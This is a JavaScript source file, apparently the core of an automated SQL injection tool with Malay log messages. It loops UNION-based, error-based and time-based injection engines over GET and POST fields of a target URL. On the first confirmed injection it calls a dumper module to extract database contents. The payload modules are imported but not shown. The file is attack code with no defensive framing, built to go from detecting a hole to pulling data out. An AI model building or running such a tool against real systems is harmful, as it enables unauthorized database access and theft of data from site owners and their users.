// scanner-core.js
const fs = require('fs');
const path = require('path');
const testUnionBased = require('./engine/engine-union');
const testErrorBased = require('./engine/engine-error');
const testTimeDelay = require('./engine-time-delay');
const runDumper = require('./engine-dumper');

async function runFullInjection(url, _, headers = {}, fields = []) {
  const allResults = [];
  const methods = ['GET', 'POST'];

  const engines = [
    { name: 'UNION-based', run: testUnionBased },
    { name: 'Error-based', run: testErrorBased },
    { name: 'Time-based', run: testTimeDelay.run }
  ];

  for (const method of methods) {
    console.log(`\n🔁 Cuba injection method: ${method}`);

    for (const engine of engines) {
      console.log(`\n⚙️  Running ${engine.name} test with ${method}...`);
      const result = await engine.run(url, method, headers, fields);
      result.forEach(r => {
        const delay = r.duration ? ` (${r.duration}ms)` : '';
        console.log(`${r.evidence ? '✔️' : '⚠️'} ${engine.name} ${r.field} = ${r.payload}${delay}`);
      });
      allResults.push(...result);

      const firstValid = result.find(r => {
        if (engine.name === 'Time-based') {
          return r.duration && r.duration > 4000; // ≥4s dianggap delay positif
        }
        return r.status === 200 && r.evidence && r.evidence.includes('<html');
      });

      if (firstValid) {
        console.log(`\n💥 Injection berjaya (${engine.name}) pada field: ${firstValid.field} (${method})`);
        const dumpLog = await runDumper(url, firstValid.field);
        dumpLog.forEach(l => console.log(l));
        return allResults;
      }
    }
  }

  return allResults;
}

module.exports = runFullInjection;
